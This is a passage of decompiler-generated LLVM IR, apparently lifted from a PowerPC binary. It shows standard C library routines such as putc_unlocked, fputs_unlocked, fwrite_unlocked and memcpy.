  %v0_1001b9a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001b9a0, label %dec_label_pc_1001b9e4, label %dec_label_pc_1001b9d8.backedge

dec_label_pc_1001b9a8:                            ; preds = %dec_label_pc_1001b978
  %v1_1001b9dc10 = inttoptr i32 %v0_1001b978 to i16*
  store i32 268548524, i32* @lr, align 4
  %v5_1001b9a8 = call i32 @getc_unlocked(i16* %v1_1001b9dc10, i32 %v3_1001b978)
  %v6_1001b9a8 = trunc i32 %v5_1001b9a8 to i8
  %v4_1001b9ac = icmp eq i8 %v6_1001b9a8, -1
  store i1 %v4_1001b9ac, i1* %cr7_eq.global-to-local, align 1
  %v3_1001b9b4 = icmp eq i8 %v6_1001b9a8, 10
  store i1 %v3_1001b9b4, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1001b9ac, label %dec_label_pc_1001b9bc, label %dec_label_pc_1001b9cc

dec_label_pc_1001b9bc:                            ; preds = %dec_label_pc_1001b9a8
  %v0_1001b9bc = load i32, i32* @r30, align 4
  %v1_1001b9bc = inttoptr i32 %v0_1001b9bc to i16*
  %v2_1001b9bc = load i16, i16* %v1_1001b9bc, align 2
  %v1_1001b9c0 = and i16 %v2_1001b9bc, 8
  %v3_1001b9c0 = icmp eq i16 %v1_1001b9c0, 0
  br i1 %v3_1001b9c0, label %dec_label_pc_1001b9bc.dec_label_pc_1001b9e4_crit_edge, label %dec_label_pc_1001b9f8

dec_label_pc_1001b9bc.dec_label_pc_1001b9e4_crit_edge: ; preds = %dec_label_pc_1001b9bc
  %v0_1001b9e4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001b9e4

dec_label_pc_1001b9cc:                            ; preds = %dec_label_pc_1001b9a8
  %v3_1001b9cc = load i32, i32* @r31, align 4
  %v4_1001b9cc = inttoptr i32 %v3_1001b9cc to i8*
  store i8 %v6_1001b9a8, i8* %v4_1001b9cc, align 1
  %v0_1001b9d0 = load i32, i32* @r31, align 4
  %v1_1001b9d0 = add i32 %v0_1001b9d0, 1
  store i32 %v1_1001b9d0, i32* @r31, align 4
  %v0_1001b9d4 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1001b9d4, label %dec_label_pc_1001b9e4, label %dec_label_pc_1001b9d8.backedge

dec_label_pc_1001b9d8.backedge:                   ; preds = %dec_label_pc_1001b9cc, %dec_label_pc_1001b98c
  %v2_1001b99412 = phi i32 [ %v1_1001b9d0, %dec_label_pc_1001b9cc ], [ %v1_1001b99c, %dec_label_pc_1001b98c ]
  %v0_1001b9d8 = load i32, i32* @r29, align 4
  %v2_1001b9d8 = add i32 %v0_1001b9d8, -1
  store i32 %v2_1001b9d8, i32* @r29, align 4
  %v0_1001b9dc = load i32, i32* @r30, align 4
  %v4_1001b9e0 = icmp eq i32 %v0_1001b9d8, 1
  br i1 %v4_1001b9e0, label %dec_label_pc_1001b9e4, label %dec_label_pc_1001b978

dec_label_pc_1001b9e4:                            ; preds = %dec_label_pc_1001b9cc, %dec_label_pc_1001b9d8.backedge, %dec_label_pc_1001b98c, %dec_label_pc_1001b970, %dec_label_pc_1001b9bc.dec_label_pc_1001b9e4_crit_edge
  %v2_1001b9f0 = phi i32 [ %v0_1001b9e4.pre, %dec_label_pc_1001b9bc.dec_label_pc_1001b9e4_crit_edge ], [ %tmp, %dec_label_pc_1001b970 ], [ %v1_1001b99c, %dec_label_pc_1001b98c ], [ %v2_1001b99412, %dec_label_pc_1001b9d8.backedge ], [ %v1_1001b9d0, %dec_label_pc_1001b9cc ]
  %v1_1001b9e4 = load i32, i32* @r28, align 4
  %v3_1001b9e4 = icmp ugt i32 %v2_1001b9f0, %v1_1001b9e4
  %v4_1001b9e4 = icmp eq i32 %v2_1001b9f0, %v1_1001b9e4
  store i1 %v4_1001b9e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001b9e4, label %dec_label_pc_1001b9ec, label %dec_label_pc_1001b9f8

dec_label_pc_1001b9ec:                            ; preds = %dec_label_pc_1001b9e4
  %v3_1001b9f0 = inttoptr i32 %v2_1001b9f0 to i8*
  store i8 0, i8* %v3_1001b9f0, align 1
  %v0_1001ba00.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001b9fc

dec_label_pc_1001b9f8:                            ; preds = %dec_label_pc_1001b9bc, %dec_label_pc_1001b9e4, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1001b9fc

dec_label_pc_1001b9fc:                            ; preds = %dec_label_pc_1001b9ec, %dec_label_pc_1001b9f8
  %v0_1001ba00 = phi i32 [ %v0_1001ba00.pre, %dec_label_pc_1001b9ec ], [ 0, %dec_label_pc_1001b9f8 ]
  ret i32 %v0_1001ba00

; uselistorder directives
  uselistorder i32 %v2_1001b9f0, { 0, 2, 1 }
  uselistorder i8 %v6_1001b9a8, { 1, 0, 2 }
  uselistorder i32 %v3_1001b97c, { 1, 0 }
  uselistorder i32 %v3_1001b978, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_1001b978, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001b9fc, { 1, 0 }
  uselistorder label %dec_label_pc_1001b9f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001b9e4, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1001b978, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* @r30, align 4
  %v2_1001ba2c = add i32 %arg2, 16
  %v3_1001ba2c = inttoptr i32 %v2_1001ba2c to i32*
  %v4_1001ba2c = load i32, i32* %v3_1001ba2c, align 4
  store i32 %v4_1001ba2c, i32* %r11.global-to-local, align 4
  %v2_1001ba30 = add i32 %arg2, 28
  %v3_1001ba30 = inttoptr i32 %v2_1001ba30 to i32*
  %v4_1001ba30 = load i32, i32* %v3_1001ba30, align 4
  %v2_1001ba34 = icmp ult i32 %v4_1001ba2c, %v4_1001ba30
  br i1 %v2_1001ba34, label %dec_label_pc_1001ba3c, label %dec_label_pc_1001ba50

dec_label_pc_1001ba3c:                            ; preds = %entry
  %v1_1001ba3c1 = zext i8 %arg1 to i32
  %v1_1001ba40 = add i32 %v4_1001ba2c, 1
  store i32 %v1_1001ba40, i32* %r9.global-to-local, align 4
  store i32 %v1_1001ba3c1, i32* %r3.global-to-local, align 4
  %v3_1001ba48 = inttoptr i32 %v4_1001ba2c to i8*
  store i8 %arg1, i8* %v3_1001ba48, align 1
  %v0_1001baf4.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1001baf4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001baf4

dec_label_pc_1001ba50:                            ; preds = %entry
  %tmp11 = inttoptr i32 %arg2 to i16*
  %v3_1001ba50 = load i16, i16* %tmp11, align 2
  %v4_1001ba50 = zext i16 %v3_1001ba50 to i32
  %v1_1001ba54 = call i32 @__asm_rlwinm(i32 %v4_1001ba50, i32 0, i32 24, i32 25)
  %v3_1001ba58 = icmp eq i32 %v1_1001ba54, 192
  br i1 %v3_1001ba58, label %dec_label_pc_1001ba74, label %dec_label_pc_1001ba60

dec_label_pc_1001ba60:                            ; preds = %dec_label_pc_1001ba50
  store i32 %arg2, i32* @r3, align 4
  store i32 128, i32* @r4, align 4
  store i32 268548716, i32* @lr, align 4
  %v0_1001ba68 = call i32 @__stdio_trans2w_o()
  store i32 %v0_1001ba68, i32* %r3.global-to-local, align 4
  %v3_1001ba6c = icmp eq i32 %v0_1001ba68, 0
  br i1 %v3_1001ba6c, label %dec_label_pc_1001ba74, label %dec_label_pc_1001bb20

dec_label_pc_1001ba74:                            ; preds = %dec_label_pc_1001ba60, %dec_label_pc_1001ba50
  %v0_1001ba74 = load i32, i32* @r31, align 4
  %v1_1001ba74 = add i32 %v0_1001ba74, 4
  %v2_1001ba74 = inttoptr i32 %v1_1001ba74 to i32*
  %v3_1001ba74 = load i32, i32* %v2_1001ba74, align 4
  %v0_1001ba78 = load i32, i32* @r30, align 4
  %v1_1001ba78 = urem i32 %v0_1001ba78, 256
  store i32 %v1_1001ba78, i32* %r3.global-to-local, align 4
  %v3_1001ba7c = icmp eq i32 %v3_1001ba74, -2
  br i1 %v3_1001ba7c, label %dec_label_pc_1001bb24, label %dec_label_pc_1001ba84

dec_label_pc_1001ba84:                            ; preds = %dec_label_pc_1001ba74
  %v1_1001ba84 = add i32 %v0_1001ba74, 12
  %v2_1001ba84 = inttoptr i32 %v1_1001ba84 to i32*
  %v3_1001ba84 = load i32, i32* %v2_1001ba84, align 4
  store i32 %v3_1001ba84, i32* %r9.global-to-local, align 4
  %v1_1001ba88 = add i32 %v0_1001ba74, 8
  %v2_1001ba88 = inttoptr i32 %v1_1001ba88 to i32*
  %v3_1001ba88 = load i32, i32* %v2_1001ba88, align 4
  %v4_1001ba8c = icmp eq i32 %v3_1001ba84, %v3_1001ba88
  br i1 %v4_1001ba8c, label %dec_label_pc_1001bafc, label %dec_label_pc_1001ba94

dec_label_pc_1001ba94:                            ; preds = %dec_label_pc_1001ba84
  %v1_1001ba94 = add i32 %v0_1001ba74, 16
  %v2_1001ba94 = inttoptr i32 %v1_1001ba94 to i32*
  %v3_1001ba94 = load i32, i32* %v2_1001ba94, align 4
  %v4_1001ba98 = icmp eq i32 %v3_1001ba84, %v3_1001ba94
  br i1 %v4_1001ba98, label %dec_label_pc_1001baa0, label %dec_label_pc_1001bab0

dec_label_pc_1001baa0:                            ; preds = %dec_label_pc_1001ba94
  store i32 %v0_1001ba74, i32* @r3, align 4
  store i32 268548776, i32* @lr, align 4
  %v0_1001baa4 = call i32 @__stdio_wcommit()
  store i32 %v0_1001baa4, i32* %r3.global-to-local, align 4
  %v3_1001baa8 = icmp eq i32 %v0_1001baa4, 0
  br i1 %v3_1001baa8, label %dec_label_pc_1001baa0.dec_label_pc_1001bab0_crit_edge, label %dec_label_pc_1001bb20

dec_label_pc_1001baa0.dec_label_pc_1001bab0_crit_edge: ; preds = %dec_label_pc_1001baa0
  %v0_1001bab0.pre = load i32, i32* @r31, align 4
  %v0_1001bab4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001bab0

dec_label_pc_1001bab0:                            ; preds = %dec_label_pc_1001baa0.dec_label_pc_1001bab0_crit_edge, %dec_label_pc_1001ba94
  %v0_1001bab4 = phi i32 [ %v0_1001bab4.pre, %dec_label_pc_1001baa0.dec_label_pc_1001bab0_crit_edge ], [ %v0_1001ba78, %dec_label_pc_1001ba94 ]
  %v0_1001bab0 = phi i32 [ %v0_1001bab0.pre, %dec_label_pc_1001baa0.dec_label_pc_1001bab0_crit_edge ], [ %v0_1001ba74, %dec_label_pc_1001ba94 ]
  %v1_1001bab0 = add i32 %v0_1001bab0, 16
  %v2_1001bab0 = inttoptr i32 %v1_1001bab0 to i32*
  %v3_1001bab0 = load i32, i32* %v2_1001bab0, align 4
  store i32 %v3_1001bab0, i32* %r9.global-to-local, align 4
  %v1_1001bab4 = urem i32 %v0_1001bab4, 256
  store i32 %v1_1001bab4, i32* %r11.global-to-local, align 4
  %v1_1001bab8 = trunc i32 %v0_1001bab4 to i8
  %v3_1001bab8 = inttoptr i32 %v3_1001bab0 to i8*
  store i8 %v1_1001bab8, i8* %v3_1001bab8, align 1
  %v0_1001babc = load i32, i32* %r9.global-to-local, align 4
  %v1_1001babc = add i32 %v0_1001babc, 1
  store i32 %v1_1001babc, i32* %r9.global-to-local, align 4
  %v1_1001bac0 = load i32, i32* @r31, align 4
  %v2_1001bac0 = add i32 %v1_1001bac0, 16
  %v3_1001bac0 = inttoptr i32 %v2_1001bac0 to i32*
  store i32 %v1_1001babc, i32* %v3_1001bac0, align 4
  %v0_1001bac4 = load i32, i32* @r31, align 4
  %v1_1001bac4 = inttoptr i32 %v0_1001bac4 to i16*
  %v2_1001bac4 = load i16, i16* %v1_1001bac4, align 2
  %v3_1001bac4 = zext i16 %v2_1001bac4 to i32
  %v1_1001bac8 = and i32 %v3_1001bac4, 256
  store i32 %v1_1001bac8, i32* %r9.global-to-local, align 4
  %v3_1001bac8 = icmp eq i32 %v1_1001bac8, 0
  br i1 %v3_1001bac8, label %dec_label_pc_1001bb18, label %dec_label_pc_1001bad0

dec_label_pc_1001bad0:                            ; preds = %dec_label_pc_1001bab0
  %v0_1001bad0 = load i32, i32* %r11.global-to-local, align 4
  %v3_1001bad0 = icmp eq i32 %v0_1001bad0, 10
  br i1 %v3_1001bad0, label %dec_label_pc_1001bad8, label %dec_label_pc_1001bb18

dec_label_pc_1001bad8:                            ; preds = %dec_label_pc_1001bad0
  store i32 %v0_1001bac4, i32* @r3, align 4
  store i32 268548832, i32* @lr, align 4
  %v0_1001badc = call i32 @__stdio_wcommit()
  store i32 %v0_1001badc, i32* %r3.global-to-local, align 4
  %v3_1001bae0 = icmp eq i32 %v0_1001badc, 0
  br i1 %v3_1001bae0, label %dec_label_pc_1001bb18, label %dec_label_pc_1001bae8

dec_label_pc_1001bae8:                            ; preds = %dec_label_pc_1001bad8
  %v0_1001bae8 = load i32, i32* @r31, align 4
  %v1_1001bae8 = add i32 %v0_1001bae8, 16
  %v2_1001bae8 = inttoptr i32 %v1_1001bae8 to i32*
  %v3_1001bae8 = load i32, i32* %v2_1001bae8, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1001baf0 = add i32 %v3_1001bae8, -1
  store i32 %v1_1001baf0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001baf4

dec_label_pc_1001baf4:                            ; preds = %dec_label_pc_1001ba3c, %dec_label_pc_1001bae8
  %v1_1001baf4 = phi i32 [ %v1_1001baf4.pre, %dec_label_pc_1001ba3c ], [ %v0_1001bae8, %dec_label_pc_1001bae8 ]
  %v0_1001baf4 = phi i32 [ %v0_1001baf4.pre, %dec_label_pc_1001ba3c ], [ %v1_1001baf0, %dec_label_pc_1001bae8 ]
  %v2_1001baf4 = add i32 %v1_1001baf4, 16
  %v3_1001baf4 = inttoptr i32 %v2_1001baf4 to i32*
  store i32 %v0_1001baf4, i32* %v3_1001baf4, align 4
  %v0_1001bb34.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001bb24

dec_label_pc_1001bafc:                            ; preds = %dec_label_pc_1001ba84
  %v1_1001bafc = inttoptr i32 %v0_1001ba74 to i16*
  store i32 %v0_1001ba74, i32* %r3.global-to-local, align 4
  %v2_1001bb00 = ptrtoint i8* %stack_var_-24 to i32
  store i32 1, i32* @r5, align 4
  %v6_1001bb08 = trunc i32 %v0_1001ba78 to i8
  store i8 %v6_1001bb08, i8* %stack_var_-24, align 1
  store i32 268548880, i32* @lr, align 4
  %v5_1001bb0c = call i32 @__stdio_WRITE(i16* %v1_1001bafc, i32 %v2_1001bb00)
  store i32 %v5_1001bb0c, i32* %r3.global-to-local, align 4
  %v3_1001bb10 = icmp eq i32 %v5_1001bb0c, 0
  br i1 %v3_1001bb10, label %dec_label_pc_1001bb20, label %dec_label_pc_1001bb18

dec_label_pc_1001bb18:                            ; preds = %dec_label_pc_1001bad0, %dec_label_pc_1001bafc, %dec_label_pc_1001bad8, %dec_label_pc_1001bab0
  %v0_1001bb18 = load i32, i32* @r30, align 4
  %v1_1001bb18 = urem i32 %v0_1001bb18, 256
  store i32 %v1_1001bb18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001bb24

dec_label_pc_1001bb20:                            ; preds = %dec_label_pc_1001baa0, %dec_label_pc_1001ba60, %dec_label_pc_1001bafc
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001bb24

dec_label_pc_1001bb24:                            ; preds = %dec_label_pc_1001ba74, %dec_label_pc_1001bb18, %dec_label_pc_1001baf4, %dec_label_pc_1001bb20
  %v0_1001bb34 = phi i32 [ %v1_1001ba78, %dec_label_pc_1001ba74 ], [ %v1_1001bb18, %dec_label_pc_1001bb18 ], [ %v0_1001bb34.pre, %dec_label_pc_1001baf4 ], [ -1, %dec_label_pc_1001bb20 ]
  ret i32 %v0_1001bb34

; uselistorder directives
  uselistorder i32 %v1_1001bb18, { 1, 0 }
  uselistorder i32 %v0_1001bab4, { 1, 0 }
  uselistorder i32 %v1_1001ba78, { 1, 0 }
  uselistorder i32 %v0_1001ba78, { 1, 2, 0 }
  uselistorder i32 %v0_1001ba74, { 2, 3, 0, 1, 4, 6, 5, 7 }
  uselistorder i32 %v4_1001ba2c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 2, 5, 10, 6, 7, 1, 8, 9, 11, 0 }
  uselistorder i32 %arg2, { 0, 4, 1, 2, 3 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001bb24, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1001bb20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001bb18, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1001baf4, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1001bb50 = call i32 @__GI_strlen()
  store i32 %v0_1001bb50, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1001bb6c.1182 to i32), i32* @lr, align 4
  %v4_1001bb68 = inttoptr i32 %arg2 to i16*
  %v5_1001bb68 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1001bb50, i16* %v4_1001bb68)
  %v1_1001bb70 = load i32, i32* @r27, align 4
  %v4_1001bb70 = icmp eq i32 %v5_1001bb68, %v1_1001bb70
  br i1 %v4_1001bb70, label %dec_label_pc_1001bb78, label %dec_label_pc_1001bb7c

dec_label_pc_1001bb78:                            ; preds = %entry
  br label %dec_label_pc_1001bb7c

dec_label_pc_1001bb7c:                            ; preds = %entry, %dec_label_pc_1001bb78
  %v0_1001bb7c = phi i32 [ -1, %entry ], [ %v5_1001bb68, %dec_label_pc_1001bb78 ]
  ret i32 %v0_1001bb7c

; uselistorder directives
  uselistorder label %dec_label_pc_1001bb7c, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_1001bbac = load i16, i16* %arg4, align 2
  %v4_1001bbac = zext i16 %v3_1001bbac to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_1001bbbc = call i32 @__asm_rlwinm(i32 %v4_1001bbac, i32 0, i32 24, i32 25)
  store i32 %tmp, i32* @r3, align 4
  %v3_1001bbc4 = icmp eq i32 %v1_1001bbbc, 192
  br i1 %v3_1001bbc4, label %dec_label_pc_1001bbd8, label %dec_label_pc_1001bbcc

dec_label_pc_1001bbcc:                            ; preds = %entry
  store i32 268549072, i32* @lr, align 4
  %v0_1001bbcc = call i32 @__stdio_trans2w_o()
  %v3_1001bbd0 = icmp eq i32 %v0_1001bbcc, 0
  br i1 %v3_1001bbd0, label %dec_label_pc_1001bbd8, label %dec_label_pc_1001bc30

dec_label_pc_1001bbd8:                            ; preds = %dec_label_pc_1001bbcc, %entry
  %v0_1001bbd8 = load i32, i32* @r29, align 4
  %v3_1001bbd8 = icmp eq i32 %v0_1001bbd8, 0
  %v0_1001bbdc = load i32, i32* @r30, align 4
  %v3_1001bbdc = icmp eq i32 %v0_1001bbdc, 0
  %brmerge = or i1 %v3_1001bbd8, %v3_1001bbdc
  br i1 %brmerge, label %dec_label_pc_1001bc30, label %dec_label_pc_1001bbe8

dec_label_pc_1001bbe8:                            ; preds = %dec_label_pc_1001bbd8
  %v2_1001bbf0 = udiv i32 -1, %v0_1001bbd8
  %v0_1001bbf4 = load i32, i32* @r31, align 4
  %v3_1001bbf8 = icmp ugt i32 %v0_1001bbdc, %v2_1001bbf0
  %v1_1001bc10 = inttoptr i32 %v0_1001bbf4 to i16*
  br i1 %v3_1001bbf8, label %dec_label_pc_1001bc10, label %dec_label_pc_1001bc00

dec_label_pc_1001bc00:                            ; preds = %dec_label_pc_1001bbe8
  %v0_1001bbec = load i32, i32* @r28, align 4
  %v2_1001bc00 = mul i32 %v0_1001bbdc, %v0_1001bbd8
  store i32 %v2_1001bc00, i32* %r4.global-to-local, align 4
  store i32 268549128, i32* @lr, align 4
  %v5_1001bc04 = call i32 @__stdio_fwrite(i32 %v0_1001bbec, i32 %v2_1001bc00, i16* %v1_1001bc10)
  %v1_1001bc08 = load i32, i32* @r29, align 4
  %v2_1001bc08 = udiv i32 %v5_1001bc04, %v1_1001bc08
  store i32 %v2_1001bc08, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001bc34

dec_label_pc_1001bc10:                            ; preds = %dec_label_pc_1001bbe8
  %v2_1001bc10 = load i16, i16* %v1_1001bc10, align 2
  %v1_1001bc14 = or i16 %v2_1001bc10, 8
  store i16 %v1_1001bc14, i16* %v1_1001bc10, align 2
  %v0_1001bc1c = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1001bc28 = inttoptr i32 %v0_1001bc1c to i32*
  store i32 22, i32* %v2_1001bc28, align 4
  %v0_1001bc38.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001bc34

dec_label_pc_1001bc30:                            ; preds = %dec_label_pc_1001bbd8, %dec_label_pc_1001bbcc
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001bc34

dec_label_pc_1001bc34:                            ; preds = %dec_label_pc_1001bc10, %dec_label_pc_1001bc00, %dec_label_pc_1001bc30
  %v0_1001bc38 = phi i32 [ %v0_1001bc38.pre, %dec_label_pc_1001bc10 ], [ %v2_1001bc08, %dec_label_pc_1001bc00 ], [ 0, %dec_label_pc_1001bc30 ]
  ret i32 %v0_1001bc38

; uselistorder directives
  uselistorder i16* %v1_1001bc10, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder i32 ()* @__stdio_trans2w_o, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001bc34, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1001bc4c = load i32, i32* @r5, align 4
  %v1_1001bc4c = call i32 @__asm_rlwinm.(i32 %v0_1001bc4c, i32 29, i32 3, i32 31)
  store i32 %v1_1001bc4c, i32* %r9.global-to-local, align 4
  %v4_1001bc4c = icmp eq i32 %v1_1001bc4c, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1001bc50 = load i32, i32* @r4, align 4
  %v1_1001bc50 = add i32 %v0_1001bc50, -4
  store i32 %v1_1001bc50, i32* %r4.global-to-local, align 4
  %v0_1001bc54 = load i32, i32* @r3, align 4
  %v1_1001bc54 = add i32 %v0_1001bc54, -4
  store i32 %v1_1001bc54, i32* @r11, align 4
  br i1 %v4_1001bc4c, label %dec_label_pc_1001bc7c, label %dec_label_pc_1001bc5c

dec_label_pc_1001bc5c:                            ; preds = %entry
  %v1_1001bc5c = urem i32 %v1_1001bc54, 4
  %v3_1001bc5c = icmp eq i32 %v1_1001bc5c, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1001bc5c, label %dec_label_pc_1001bc64, label %dec_label_pc_1001bcb8

dec_label_pc_1001bc64:                            ; preds = %dec_label_pc_1001bcd8.dec_label_pc_1001bc64_crit_edge, %dec_label_pc_1001bc5c
  %v1_1001bc70.pre = phi i32 [ %v1_1001bc54, %dec_label_pc_1001bc5c ], [ %v1_1001bc70.pre.pre, %dec_label_pc_1001bcd8.dec_label_pc_1001bc64_crit_edge ]
  %v0_1001bc64 = phi i32 [ %v1_1001bc4c, %dec_label_pc_1001bc5c ], [ %v1_1001bcd8, %dec_label_pc_1001bcd8.dec_label_pc_1001bc64_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1001bc5c ], [ %v2_1001bcc0, %dec_label_pc_1001bcd8.dec_label_pc_1001bc64_crit_edge ]
  store i32 %v0_1001bc64, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001bc68

dec_label_pc_1001bc68:                            ; preds = %dec_label_pc_1001bc68, %dec_label_pc_1001bc64
  %v1_1001bc70 = phi i32 [ %v2_1001bc74, %dec_label_pc_1001bc68 ], [ %v1_1001bc70.pre, %dec_label_pc_1001bc64 ]
  %v0_1001bc68 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001bc68 = add i32 %v0_1001bc68, 4
  %v2_1001bc68 = inttoptr i32 %v1_1001bc68 to i32*
  %v3_1001bc68 = load i32, i32* %v2_1001bc68, align 4
  %v1_1001bc6c = add i32 %v0_1001bc68, 8
  %v2_1001bc6c = inttoptr i32 %v1_1001bc6c to i32*
  %v3_1001bc6c = load i32, i32* %v2_1001bc6c, align 4
  store i32 %v3_1001bc6c, i32* %r9.global-to-local, align 4
  store i32 %v1_1001bc6c, i32* %r4.global-to-local, align 4
  %v2_1001bc70 = add i32 %v1_1001bc70, 4
  %v3_1001bc70 = inttoptr i32 %v2_1001bc70 to i32*
  store i32 %v3_1001bc68, i32* %v3_1001bc70, align 4
  %v0_1001bc74 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001bc74 = load i32, i32* @r11, align 4
  %v2_1001bc74 = add i32 %v1_1001bc74, 8
  %v3_1001bc74 = inttoptr i32 %v2_1001bc74 to i32*
  store i32 %v0_1001bc74, i32* %v3_1001bc74, align 4
  store i32 %v2_1001bc74, i32* @r11, align 4
  %v0_1001bc78 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bc78 = add i32 %v0_1001bc78, -1
  store i32 %v1_1001bc78, i32* %ctr.global-to-local, align 4
  %v2_1001bc78 = icmp eq i32 %v1_1001bc78, 0
  br i1 %v2_1001bc78, label %dec_label_pc_1001bc7c, label %dec_label_pc_1001bc68

dec_label_pc_1001bc7c:                            ; preds = %dec_label_pc_1001bc68, %dec_label_pc_1001bcd8, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1001bcc0, %dec_label_pc_1001bcd8 ], [ %.0, %dec_label_pc_1001bc68 ]
  %v1_1001bc7c = urem i32 %.1, 8
  store i32 %v1_1001bc7c, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1001bc7c, 4
  br i1 %tmp, label %dec_label_pc_1001bc94, label %dec_label_pc_1001bc88

dec_label_pc_1001bc88:                            ; preds = %dec_label_pc_1001bc7c
  %v0_1001bc88 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001bc88 = add i32 %v0_1001bc88, 4
  %v2_1001bc88 = inttoptr i32 %v1_1001bc88 to i32*
  %v3_1001bc88 = load i32, i32* %v2_1001bc88, align 4
  store i32 %v1_1001bc88, i32* %r4.global-to-local, align 4
  %v1_1001bc8c = add nsw i32 %v1_1001bc7c, -4
  store i32 %v1_1001bc8c, i32* @r5, align 4
  %v1_1001bc90 = load i32, i32* @r11, align 4
  %v2_1001bc90 = add i32 %v1_1001bc90, 4
  %v3_1001bc90 = inttoptr i32 %v2_1001bc90 to i32*
  store i32 %v3_1001bc88, i32* %v3_1001bc90, align 4
  store i32 %v2_1001bc90, i32* @r11, align 4
  %v0_1001bc94.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1001bc94

dec_label_pc_1001bc94:                            ; preds = %dec_label_pc_1001bc7c, %dec_label_pc_1001bc88
  %v0_1001bc94 = phi i32 [ %v1_1001bc7c, %dec_label_pc_1001bc7c ], [ %v0_1001bc94.pre, %dec_label_pc_1001bc88 ]
  %v3_1001bc94 = icmp eq i32 %v0_1001bc94, 0
  %v0_1001bc98 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001bc94, i32 %v0_1001bc98)
  %v0_1001bc9c = load i32, i32* @r5, align 4
  store i32 %v0_1001bc9c, i32* %ctr.global-to-local, align 4
  %v0_1001bca0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001bca0 = add i32 %v0_1001bca0, 3
  store i32 %v1_1001bca0, i32* %r4.global-to-local, align 4
  %v0_1001bca4 = load i32, i32* @r11, align 4
  %v1_1001bca4 = add i32 %v0_1001bca4, 3
  store i32 %v1_1001bca4, i32* %r9.global-to-local, align 4
  %v1_1001bca89 = add i32 %v0_1001bca0, 4
  %v2_1001bca810 = inttoptr i32 %v1_1001bca89 to i8*
  %v3_1001bca811 = load i8, i8* %v2_1001bca810, align 1
  store i32 %v1_1001bca89, i32* %r4.global-to-local, align 4
  %v3_1001bcac13 = add i32 %v0_1001bca4, 4
  %v4_1001bcac14 = inttoptr i32 %v3_1001bcac13 to i8*
  store i8 %v3_1001bca811, i8* %v4_1001bcac14, align 1
  store i32 %v3_1001bcac13, i32* %r9.global-to-local, align 4
  %v0_1001bcb015 = load i32, i32* %ctr.global-to-local, align 4
